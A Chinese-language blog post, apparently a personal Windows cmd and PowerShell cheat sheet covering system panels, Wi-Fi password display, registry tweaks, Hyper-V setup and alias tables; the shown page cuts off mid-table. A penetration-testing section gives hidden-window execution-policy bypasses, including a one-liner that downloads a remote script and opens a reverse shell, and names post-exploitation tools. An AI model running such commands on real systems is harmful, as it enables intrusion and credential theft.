<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="dark-blue" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://cdn.jsdelivr.net/npm/@primer/css@21.5.1/dist/primer.min.css' rel='stylesheet' />
    <link rel="icon" href="../favicon.svg">
<meta name="description" content="# cmd命令

## 各种面板
http://wingsan.web.fc2.com/WinCom/index.html

命令|说明
---|---
winver|windows版本
lusrmgr.msc|用户和组
netplwiz|用户账号管理
compmgmt.msc|电脑管理
devmgmt.msc　|硬件管理
diskmgmt.msc　|磁盘管理
dxdiag　|DirectX診断
regedit　|注册表
firewall.cpl |防火墙
control　|控制面板
services.msc |服务进程
taskmgr　|任务管理
appwiz.cpl　|软件一览
ComputerDefaults　|window默认程序
OptionalFeatures　|window附加功能★
sysdm.cpl　|环境变量★
fsmgmt.msc |共享文件夹
mstsc　|远程桌面
fonts　|字体


## 查看IP
```
内网　ipconfig
公网　curl ipinfo.io
网络诊断　tracert www.google.com
```

## WIFI密码
```
netsh wlan show profiles                         　←查看名字
netsh wlan show profiles name=xxxx key=clear        ←名字代入
```

## 强制启动旧版IE6.0浏览器
```
CreateObject('InternetExplorer.Application').Visible=true
保存为vbs
```

## 修复系统文件
```
sfc /scannow
```

## 恢复应用商店
```
wsreset -i
```

## 右键菜单
```
传统菜单(Win10)　reg add 'HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32' /f /ve
折叠菜单(Win11)　reg delete 'HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}' /f 
```

## 永久暂停Windows自动更新
```
reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' /v FlightSettingsMaxPauseDays /t reg_dword /d 9999 /f
```


## Windows家庭版，强制开启hyper-v

```
pushd '%~dp0'
dir /b %SystemRoot%servicingPackages*Hyper-V*.mum >hv.txt
for /f %%i in ('findstr /i . hv.txt 2^>nul') do dism /online /norestart /add-package:'%SystemRoot%servicingPackages%%i'
del hv.txt
Dism /online /enable-feature /featurename:Microsoft-Hyper-V -All /LimitAccess /ALL
pause

将文本文档改名为'xxx.bat'，需注意.bat是扩展名
运行完成后，重启电脑
```



## Window附加功能
```
機能の確認     dism /online /Get-Features
機能の有効化  dism /online /Enable-Feature:役割名
機能の無効化  dism /online /Disable-Feature:役割名
```

```
＜Hyper-V＞ 
dism /online /enable-feature /featurename:Microsoft-Hyper-V/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-All/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Hypervisor/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Services/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Tools-All/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Management-Clients/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Management-PowerShell/all /norestart

＜WSL＞
dism /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart

＜虚拟机Platform＞
dism /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
```

表示名 | 機能名
-- | --
.NET Framework 3.5 (.NET 2.0 および 3.0 を含む) | NetFx3
.NET Framework 4.8 Advanced Services | NetFx4-AdvSrvs
-- | --
Hyper-V | Microsoft-Hyper-V
Hyper-V プラットフォーム | Microsoft-Hyper-V-All
Hyper-V Hypervisor | Microsoft-Hyper-V-Hypervisor
Hyper-V サービス | Microsoft-Hyper-V-Services
Hyper-V 管理ツール | Microsoft-Hyper-V-Tools-All
Hyper-V GUI 管理ツール | Microsoft-Hyper-V-Management-Clients
Windows PowerShell 用 Hyper-V モジュール | Microsoft-Hyper-V-Management-PowerShell
-- | --
Linux 用 Windows サブシステム | Microsoft-Windows-Subsystem-Linux
-- | --
仮想マシン プラットフォーム | VirtualMachinePlatform







# Powershell命令

## Powershell的基本概念

## ps1文件
一个PowerShell脚本其实就是一个简单的文本文件， 这个文件包含了一系列PowerShell命令，每个命令显示为独立的一行，文件名需要加上.ps1的扩展名。">
<meta property="og:title" content="Vol.12 Win cmd & Powershell">
<meta property="og:description" content="# cmd命令

## 各种面板
http://wingsan.web.fc2.com/WinCom/index.html

命令|说明
---|---
winver|windows版本
lusrmgr.msc|用户和组
netplwiz|用户账号管理
compmgmt.msc|电脑管理
devmgmt.msc　|硬件管理
diskmgmt.msc　|磁盘管理
dxdiag　|DirectX診断
regedit　|注册表
firewall.cpl |防火墙
control　|控制面板
services.msc |服务进程
taskmgr　|任务管理
appwiz.cpl　|软件一览
ComputerDefaults　|window默认程序
OptionalFeatures　|window附加功能★
sysdm.cpl　|环境变量★
fsmgmt.msc |共享文件夹
mstsc　|远程桌面
fonts　|字体


## 查看IP
```
内网　ipconfig
公网　curl ipinfo.io
网络诊断　tracert www.google.com
```

## WIFI密码
```
netsh wlan show profiles                         　←查看名字
netsh wlan show profiles name=xxxx key=clear        ←名字代入
```

## 强制启动旧版IE6.0浏览器
```
CreateObject('InternetExplorer.Application').Visible=true
保存为vbs
```

## 修复系统文件
```
sfc /scannow
```

## 恢复应用商店
```
wsreset -i
```

## 右键菜单
```
传统菜单(Win10)　reg add 'HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32' /f /ve
折叠菜单(Win11)　reg delete 'HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}' /f 
```

## 永久暂停Windows自动更新
```
reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' /v FlightSettingsMaxPauseDays /t reg_dword /d 9999 /f
```


## Windows家庭版，强制开启hyper-v

```
pushd '%~dp0'
dir /b %SystemRoot%servicingPackages*Hyper-V*.mum >hv.txt
for /f %%i in ('findstr /i . hv.txt 2^>nul') do dism /online /norestart /add-package:'%SystemRoot%servicingPackages%%i'
del hv.txt
Dism /online /enable-feature /featurename:Microsoft-Hyper-V -All /LimitAccess /ALL
pause

将文本文档改名为'xxx.bat'，需注意.bat是扩展名
运行完成后，重启电脑
```



## Window附加功能
```
機能の確認     dism /online /Get-Features
機能の有効化  dism /online /Enable-Feature:役割名
機能の無効化  dism /online /Disable-Feature:役割名
```

```
＜Hyper-V＞ 
dism /online /enable-feature /featurename:Microsoft-Hyper-V/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-All/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Hypervisor/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Services/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Tools-All/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Management-Clients/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Management-PowerShell/all /norestart

＜WSL＞
dism /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart

＜虚拟机Platform＞
dism /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
```

表示名 | 機能名
-- | --
.NET Framework 3.5 (.NET 2.0 および 3.0 を含む) | NetFx3
.NET Framework 4.8 Advanced Services | NetFx4-AdvSrvs
-- | --
Hyper-V | Microsoft-Hyper-V
Hyper-V プラットフォーム | Microsoft-Hyper-V-All
Hyper-V Hypervisor | Microsoft-Hyper-V-Hypervisor
Hyper-V サービス | Microsoft-Hyper-V-Services
Hyper-V 管理ツール | Microsoft-Hyper-V-Tools-All
Hyper-V GUI 管理ツール | Microsoft-Hyper-V-Management-Clients
Windows PowerShell 用 Hyper-V モジュール | Microsoft-Hyper-V-Management-PowerShell
-- | --
Linux 用 Windows サブシステム | Microsoft-Windows-Subsystem-Linux
-- | --
仮想マシン プラットフォーム | VirtualMachinePlatform







# Powershell命令

## Powershell的基本概念

## ps1文件
一个PowerShell脚本其实就是一个简单的文本文件， 这个文件包含了一系列PowerShell命令，每个命令显示为独立的一行，文件名需要加上.ps1的扩展名。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://grapehut.xyz/post/12.html">
<meta property="og:image" content="">
<title>Vol.12 Win cmd & Powershell</title>




</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
.copy-feedback {
    display: none;
    position: absolute;
    top: 10px;
    right: 50px;
    color: var(--color-fg-on-emphasis);
    background-color: var(--color-fg-muted);
    border-radius: 3px;
    padding: 5px 8px;
    font-size: 12px;
}
</style>




<body>
    <div id="header">
<h1 class="postTitle">Vol.12 Win cmd & Powershell</h1>
<div class="title-right">
    <a href="https://grapehut.xyz/tag.html" id="buttonSearch" class="btn btn-invisible circle" title="搜索🔍">
        <svg class="octicon" width="16" height="16" >
            <path id="pathSearch" fill-rule="evenodd"></path>
        </svg>
    </a>
    <a href="https://grapehut.xyz" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<nav style="text-align:right">created at 2025-09-21 09:07,　last updated at 2025-09-21 09:07</nav>
<div class="markdown-body spoiler" id="postBody"><h1>cmd命令</h1>
<h2>各种面板</h2>
<p><a href="http://wingsan.web.fc2.com/WinCom/index.html" rel="nofollow">http://wingsan.web.fc2.com/WinCom/index.html</a></p>
<markdown-accessiblity-table><table role="table">
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>winver</td>
<td>windows版本</td>
</tr>
<tr>
<td>lusrmgr.msc</td>
<td>用户和组</td>
</tr>
<tr>
<td>netplwiz</td>
<td>用户账号管理</td>
</tr>
<tr>
<td>compmgmt.msc</td>
<td>电脑管理</td>
</tr>
<tr>
<td>devmgmt.msc　</td>
<td>硬件管理</td>
</tr>
<tr>
<td>diskmgmt.msc　</td>
<td>磁盘管理</td>
</tr>
<tr>
<td>dxdiag　</td>
<td>DirectX診断</td>
</tr>
<tr>
<td>regedit　</td>
<td>注册表</td>
</tr>
<tr>
<td>firewall.cpl</td>
<td>防火墙</td>
</tr>
<tr>
<td>control　</td>
<td>控制面板</td>
</tr>
<tr>
<td>services.msc</td>
<td>服务进程</td>
</tr>
<tr>
<td>taskmgr　</td>
<td>任务管理</td>
</tr>
<tr>
<td>appwiz.cpl　</td>
<td>软件一览</td>
</tr>
<tr>
<td>ComputerDefaults　</td>
<td>window默认程序</td>
</tr>
<tr>
<td>OptionalFeatures　</td>
<td>window附加功能★</td>
</tr>
<tr>
<td>sysdm.cpl　</td>
<td>环境变量★</td>
</tr>
<tr>
<td>fsmgmt.msc</td>
<td>共享文件夹</td>
</tr>
<tr>
<td>mstsc　</td>
<td>远程桌面</td>
</tr>
<tr>
<td>fonts　</td>
<td>字体</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<h2>查看IP</h2>
<pre class="notranslate"><code class="notranslate">内网　ipconfig
公网　curl ipinfo.io
网络诊断　tracert www.google.com
</code></pre>
<h2>WIFI密码</h2>
<pre class="notranslate"><code class="notranslate">netsh wlan show profiles                         　←查看名字
netsh wlan show profiles name=xxxx key=clear        ←名字代入
</code></pre>
<h2>强制启动旧版IE6.0浏览器</h2>
<pre class="notranslate"><code class="notranslate">CreateObject("InternetExplorer.Application").Visible=true
保存为vbs
</code></pre>
<h2>修复系统文件</h2>
<pre class="notranslate"><code class="notranslate">sfc /scannow
</code></pre>
<h2>恢复应用商店</h2>
<pre class="notranslate"><code class="notranslate">wsreset -i
</code></pre>
<h2>右键菜单</h2>
<pre class="notranslate"><code class="notranslate">传统菜单(Win10)　reg add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /f /ve
折叠菜单(Win11)　reg delete "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}" /f 
</code></pre>
<h2>永久暂停Windows自动更新</h2>
<pre class="notranslate"><code class="notranslate">reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" /v FlightSettingsMaxPauseDays /t reg_dword /d 9999 /f
</code></pre>
<h2>Windows家庭版，强制开启hyper-v</h2>
<pre class="notranslate"><code class="notranslate">pushd "%~dp0"
dir /b %SystemRoot%servicingPackages*Hyper-V*.mum &gt;hv.txt
for /f %%i in ('findstr /i . hv.txt 2^&gt;nul') do dism /online /norestart /add-package:"%SystemRoot%servicingPackages%%i"
del hv.txt
Dism /online /enable-feature /featurename:Microsoft-Hyper-V -All /LimitAccess /ALL
pause

将文本文档改名为"xxx.bat"，需注意.bat是扩展名
运行完成后，重启电脑
</code></pre>
<h2>Window附加功能</h2>
<pre class="notranslate"><code class="notranslate">機能の確認     dism /online /Get-Features
機能の有効化  dism /online /Enable-Feature:役割名
機能の無効化  dism /online /Disable-Feature:役割名
</code></pre>
<pre class="notranslate"><code class="notranslate">＜Hyper-V＞ 
dism /online /enable-feature /featurename:Microsoft-Hyper-V/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-All/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Hypervisor/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Services/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Tools-All/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Management-Clients/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Management-PowerShell/all /norestart

＜WSL＞
dism /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart

＜虚拟机Platform＞
dism /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
</code></pre>
<markdown-accessiblity-table><table role="table">
<thead>
<tr>
<th>表示名</th>
<th>機能名</th>
</tr>
</thead>
<tbody>
<tr>
<td>.NET Framework 3.5 (.NET 2.0 および 3.0 を含む)</td>
<td>NetFx3</td>
</tr>
<tr>
<td>.NET Framework 4.8 Advanced Services</td>
<td>NetFx4-AdvSrvs</td>
</tr>
<tr>
<td>--</td>
<td>--</td>
</tr>
<tr>
<td>Hyper-V</td>
<td>Microsoft-Hyper-V</td>
</tr>
<tr>
<td>Hyper-V プラットフォーム</td>
<td>Microsoft-Hyper-V-All</td>
</tr>
<tr>
<td>Hyper-V Hypervisor</td>
<td>Microsoft-Hyper-V-Hypervisor</td>
</tr>
<tr>
<td>Hyper-V サービス</td>
<td>Microsoft-Hyper-V-Services</td>
</tr>
<tr>
<td>Hyper-V 管理ツール</td>
<td>Microsoft-Hyper-V-Tools-All</td>
</tr>
<tr>
<td>Hyper-V GUI 管理ツール</td>
<td>Microsoft-Hyper-V-Management-Clients</td>
</tr>
<tr>
<td>Windows PowerShell 用 Hyper-V モジュール</td>
<td>Microsoft-Hyper-V-Management-PowerShell</td>
</tr>
<tr>
<td>--</td>
<td>--</td>
</tr>
<tr>
<td>Linux 用 Windows サブシステム</td>
<td>Microsoft-Windows-Subsystem-Linux</td>
</tr>
<tr>
<td>--</td>
<td>--</td>
</tr>
<tr>
<td>仮想マシン プラットフォーム</td>
<td>VirtualMachinePlatform</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<h1>Powershell命令</h1>
<h2>Powershell的基本概念</h2>
<h2>ps1文件</h2>
<p>一个PowerShell脚本其实就是一个简单的文本文件， 这个文件包含了一系列PowerShell命令，每个命令显示为独立的一行，文件名需要加上.ps1的扩展名。</p>
<h2>运行脚本</h2>
<p>运行PowerShell脚本，必须键入完整的路径和文件名，例如，你要运行一个名为a.ps1的脚本，可以键入C:\Scripts\a.ps1</p>
<h2>获取 PowerShell Command一覧</h2>
<pre class="notranslate"><code class="notranslate">PS&gt;  gcm　或者   PS&gt;  get-command
</code></pre>
<h2>Powershell的常用命令</h2>
<p>在PowerShell下，类似“cmd命令"叫作"cmdlet" ，其命名规范相当一致，都采用"动词-名词”的形式，如New-ltem，动词部分般为Add、 New、Get、Remove、Set等， 命名的别名一般兼容Windows Command和Linux Shell,如Get-Childltem命令使用dir或|s均可，而且<strong>PowerShell命令不区分大小写</strong></p>
<p>下面以文件操作为例讲解PowerShell命令的基本用法</p>
<ul>
<li>新建目录: New-Item -Path 'E:\Test Folder' -ItemType Directory</li>
<li>新建文件: New-Item -Path new.txt -ItemType File</li>
<li>删除目录: Remove-Item 'E:\Test Folder'</li>
<li>显示文本内容: Get-Content new.txt</li>
<li>置文本内容: Set-Content new.txt -Value "hello, word! "</li>
<li>追加内容: Add-Content new.txt -Value "i love you"</li>
<li>清除内容: Clear-Content new.txt</li>
</ul>
<h2>管道</h2>
<p>管道的作用是将一个命令的输出作为另一个命令的输入， 两个命令之间用管道符号<code class="notranslate">|</code> 连接。<br>
举一个例子、停止所有目前运行中的，以"p"字符开头命名的程序，命令如下所示。</p>
<pre class="notranslate"><code class="notranslate">PS&gt; get-process p* | stop-process
</code></pre>
<h1>Powershell进阶篇</h1>
<h2>执行策略</h2>
<p>为防止恶意脚本的执行，PowerShell的执行策略，默认情况下，Restricted:脚本不能运行，可以通过以下命令查看当前的执行策略。</p>
<ul>
<li>
<p>Get-ExecutionPolicy：</p>
<ul>
<li>Restricted:脚本不能运行(默认设置)。</li>
<li>RemoteSigned:本地创建的脚本可以运行，但从网上下载的脚本不能运行(拥有数字证书签名的除外)。</li>
<li>AllSigned:仅当脚本由受信任的发布者签名时才能运行。</li>
<li>Unrestricted: 允许所有的script运行。</li>
</ul>
</li>
<li>
<p>Set-ExecutionPolicy <br>
可以通过上面命令改变PowerShell的执行策略。</p>
</li>
</ul>
<p>如果要运行PowerShell脚本程序，必须用管理员权限将Restricted策略改成Unrestricted，所以在渗透时，就需要采用一些方法绕过策略来执行脚本， 比如下面这三种。</p>
<ol>
<li>绕过本地权限执行<br>
上传xx.ps1至目标服务器，在CMD环境下，在目标服务器本地执行该脚本，如下所示。</li>
</ol>
<pre class="notranslate"><code class="notranslate">PowerShell.exe -ExecutionPolicy Bypass -File xx.ps1
</code></pre>
<ol start="2">
<li>本地隐藏绕过权限执行脚本</li>
</ol>
<pre class="notranslate"><code class="notranslate">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile File xx.ps1
</code></pre>
<ol start="3">
<li>用IEX下载远程PS1脚本绕过权限执行</li>
</ol>
<pre class="notranslate"><code class="notranslate">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonI -NoProfile iex (New-Object Net.WebClient).DownloadString("xxx.ps1");Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
</code></pre>
<p>上述参数的说明，如下</p>
<ul>
<li><code class="notranslate">ExecutionPolicy Bypass</code>绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell的安全策略规定了PowerShell不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全保护规则</li>
<li><code class="notranslate">WindowStyle Hidden</code>　隐藏窗口</li>
<li><code class="notranslate">NoLogo</code>　启动不显示版权标志的PowerShell.</li>
<li><code class="notranslate">NonInteractive (-Nonl) </code>　非交互模式，PowerShell不为用户提供交互的提示。</li>
<li><code class="notranslate">NoProfile (-NoP) </code>　PowerShell控制台不加载当前用户的配置文件。</li>
<li><code class="notranslate">Noexit</code>　执行后不退出Shell。这在使用键盘记录脚本时非常重要。</li>
</ul>
<h2>常用的PowerShel攻击工具有以下这几种</h2>
<ul>
<li>
<p><code class="notranslate">PowerSplit</code>　这是众多PowerShell攻击工具中被广泛使用的PowerShel后期漏洞利用框架，常用于信息探测、特权提升、凭证窃取、持久化等操作。</p>
</li>
<li>
<p><code class="notranslate">Nishang</code>　基于PowerShell的渗透测试专用工具， 集成了框架、脚本和各种Payload,包含下载和执行、键盘记录、DNS、 延时命令等脚本。</p>
</li>
<li>
<p><code class="notranslate">Empire</code>　基于PowerShel的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块、信息探测、凭据窃取、持久化控制。</p>
</li>
<li>
<p><code class="notranslate">PowerCat</code>　Powershell版的NetCat, 有着网络工具中的"瑞士军刀”美誉，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，可以在脚本中以多种方式使用它。</p>
</li>
</ul>
<h1>获取 PowerShell Alias一覧</h1>
<pre class="notranslate"><code class="notranslate">PS&gt;  gal　或者   PS&gt;  Get-Alias
</code></pre>
<p><img src="https://linuxhint.com/wp-content/uploads/2022/01/create-powershell-alias-01.png"></p>
<h2>PowerShell Alias一覧</h2>
<markdown-accessiblity-table><table role="table">
<thead>
<tr>
<th>PowerShell Alias</th>
<th>PowerShell Command</th>
<th>例子</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>命令</strong></td>
<td><strong>Command</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>gcm 👙</td>
<td>Get-Command</td>
<td>例：<code class="notranslate">Get-Command Get-*</code>　查找所有以 Get- 开头的 cmdlets</td>
</tr>
<tr>
<td>icm</td>
<td>Invoke-Command</td>
<td></td>
</tr>
<tr>
<td>shcm</td>
<td>Show-Command</td>
<td></td>
</tr>
<tr>
<td>trcm</td>
<td>Trace-Command</td>
<td></td>
</tr>
<tr>
<td><strong>别名</strong></td>
<td><strong>Alias</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>gal 👙</td>
<td>Get-Alias</td>
<td>显示PowerShell Alias一覧</td>
</tr>
<tr>
<td>nal</td>
<td>New-Alias</td>
<td></td>
</tr>
<tr>
<td>sal</td>
<td>Set-Alias</td>
<td></td>
</tr>
<tr>
<td>ipal</td>
<td>Import-Alias</td>
<td></td>
</tr>
<tr>
<td>epal</td>
<td>Export-Alias</td>
<td></td>
</tr>
<tr>
<td><strong>磁盘</strong></td>
<td><strong>PSDrive</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>gdr 👙</td>
<td>Get-PSDrive</td>
<td></td>
</tr>
<tr>
<td>mount 👙</td>
<td>New-PSDrive</td>
<td></td>
</tr>
<tr>
<td>ndr</td>
<td>New-PSDrive</td>
<td></td>
</tr>
<tr>
<td>rdr</td>
<td>Remove-PSDrive</td>
<td></td>
</tr>
<tr>
<td><strong>目录</strong></td>
<td><strong>Location</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>pwd 👙</td>
<td>Get-Location</td>
<td>显示当前所在目录</td>
</tr>
<tr>
<td>gl</td>
<td>Get-Location</td>
<td>同上</td>
</tr>
<tr>
<td>cd 👙</td>
<td>Set-Location</td>
<td>例：<code class="notranslate">Set-Location C:\Users\YourName\Documents</code>  切换文档目录</td>
</tr>
<tr>
<td>chdir</td>
<td>Set-Location</td>
<td>同上</td>
</tr>
<tr>
<td>sl</td>
<td>Set-Location</td>
<td>同上</td>
</tr>
<tr>
<td>popd</td>
<td>Pop-Location</td>
<td>？</td>
</tr>
<tr>
<td>pushd</td>
<td>Push-Location</td>
<td>？</td>
</tr>
<tr>
<td><strong>子目录或文件</strong></td>
<td><strong>ChildItem</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>ls 👙</td>
<td>Get-ChildItem</td>
<td>列出当前目录下的所有文件和目录</td>
</tr>
<tr>
<td>dir 👙</td>
<td>Get-ChildItem</td>
<td>同上</td>
</tr>
<tr>
<td>gci</td>
<td>Get-ChildItem</td>
<td>同上</td>
</tr>
<tr>
<td><strong>操作目录或文件</strong></td>
<td><strong>Item</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>copy 👙</td>
<td>Copy-Item</td>
<td>例：<code class="notranslate">Copy-Item C:\source\test.txt C:\destination\</code>  复制文件 test.txt 到另一个目录</td>
</tr>
<tr>
<td>cp 👙</td>
<td>Copy-Item</td>
<td>同上</td>
</tr>
<tr>
<td>cpi</td>
<td>Copy-Item</td>
<td>同上</td>
</tr>
<tr>
<td>mv 👙</td>
<td>Move-Item</td>
<td>例：<code class="notranslate">Move-Item C:\temp\oldname.txt C:\temp\newfolder\newname.txt</code>  将文件 oldname.txt 移动到 newfolder 并重命名为 newname.txt</td>
</tr>
<tr>
<td>move</td>
<td>Move-Item</td>
<td>同上</td>
</tr>
<tr>
<td>mi</td>
<td>Move-Item</td>
<td>同上</td>
</tr>
<tr>
<td>ren 👙</td>
<td>Rename-Item</td>
<td>例：<code class="notranslate">Rename-Item C:\temp\oldname.txt C:\temp\newname.txt</code>  将文件 oldname.txt 重命名为 newname.txt</td>
</tr>
<tr>
<td>rni</td>
<td>Rename-Item</td>
<td>同上</td>
</tr>
<tr>
<td>del 👙</td>
<td>Remove-Item</td>
<td>例：<code class="notranslate">Remove-Item C:\temp\test.txt -Force</code>  删除名为 test.txt 的文件</td>
</tr>
<tr>
<td>rm 👙</td>
<td>Remove-Item</td>
<td>同上</td>
</tr>
<tr>
<td>rmdir 👙</td>
<td>Remove-Item</td>
<td>同上</td>
</tr>
<tr>
<td>erase</td>
<td>Remove-Item</td>
<td>同上</td>
</tr>
<tr>
<td>rd</td>
<td>Remove-Item</td>
<td>同上</td>
</tr>
<tr>
<td>ri</td>
<td>Remove-Item</td>
<td>同上</td>
</tr>
<tr>
<td>ni</td>
<td>New-Item</td>
<td>例：<code class="notranslate">New-Item -ItemType Directory -Path .\myFolder</code>  在当前目录下创建一个名为 myFolder 的新目录</td>
</tr>
<tr>
<td>gi</td>
<td>Get-Item</td>
<td>？</td>
</tr>
<tr>
<td>si</td>
<td>Set-Item</td>
<td>？</td>
</tr>
<tr>
<td>ii</td>
<td>Invoke-Item</td>
<td>？</td>
</tr>
<tr>
<td>cli</td>
<td>Clear-Item</td>
<td>？</td>
</tr>
<tr>
<td>md 👙</td>
<td>mkdir</td>
<td>创建文件夹</td>
</tr>
<tr>
<td><strong>操作目录或文件属性</strong></td>
<td><strong>ItemProperty</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>gp</td>
<td>Get-ItemProperty</td>
<td></td>
</tr>
<tr>
<td>sp</td>
<td>Set-ItemProperty</td>
<td></td>
</tr>
<tr>
<td>clp</td>
<td>Clear-ItemProperty</td>
<td></td>
</tr>
<tr>
<td>rnp</td>
<td>Rename-ItemProperty</td>
<td></td>
</tr>
<tr>
<td>rp</td>
<td>Remove-ItemProperty</td>
<td></td>
</tr>
<tr>
<td>cpp</td>
<td>Copy-ItemProperty</td>
<td></td>
</tr>
<tr>
<td>mp</td>
<td>Move-ItemProperty</td>
<td></td>
</tr>
<tr>
<td>gpv</td>
<td>Get-ItemPropertyValue</td>
<td></td>
</tr>
<tr>
<td><strong>变量</strong></td>
<td><strong>Variable</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>set</td>
<td>Set-Variable</td>
<td></td>
</tr>
<tr>
<td>sv</td>
<td>Set-Variable</td>
<td></td>
</tr>
<tr>
<td>gv</td>
<td>Get-Variable</td>
<td></td>
</tr>
<tr>
<td>nv</td>
<td>New-Variable</td>
<td></td>
</tr>
<tr>
<td>clv</td>
<td>Clear-Variable</td>
<td></td>
</tr>
<tr>
<td>rv</td>
<td>Remove-Variable</td>
<td></td>
</tr>
<tr>
<td><strong>对象</strong></td>
<td><strong>Object</strong></td>
<td><strong>⇣⇣⇣⇣⇣</strong></td>
</tr>
<tr>
<td>%</td>
<td>ForEach-Object</td>
<td></td>
</tr>
<tr>
<td>foreach</td>
<td>ForEach-Object</td>
<td></td>
</tr>
<tr>
<td>?</td>
<td>Where-Object</td>
<td></td>
</tr>
<tr>
<td>where</td>
<td>Where-Object</td>
<td>例：<code class="notranslate">Get-Process | Where-Object { $_.CPU -gt 10 }</code>  获取 CPU 占用率大于 10% 的所有进程</td>
</tr>
<tr>
<td>group</td>
<td>Group-Object</td>
<td>例：<code class="notranslate">Get-Process | Group-Object -Property MainModule.FileName</code>  按主模块的文件名分组进程</td>
</tr>
<tr>
<td>sort</td>
<td>Sort-Object</td>
<td>例：<code class="notranslate">Get-Process | Sort-Object -Property CPU -Desc</code>   按 CPU 占用率降序排列所有进程</td>
</tr>
<tr>
<td>measure</td>
<td>Measure-Object</td>
<td></td>
</tr>
<tr>
<td>select</td>
<td>Select-Object</td>
<td></td>
</tr>
<tr>
<td>tee</td>
<td>Tee-Object</td>
<td></td>
</tr>
<tr>
<td>gwmi 👙</td>
<td>Get-WmiObject</td>
<td>例：<code class="notranslate">Get-WmiObject -Class Win32_OperatingSystem</code>  获取操作系统信息</td>
</tr>
<tr>
<td>rwmi</td>
<td>Remove-WmiObject</td>
<td></td>
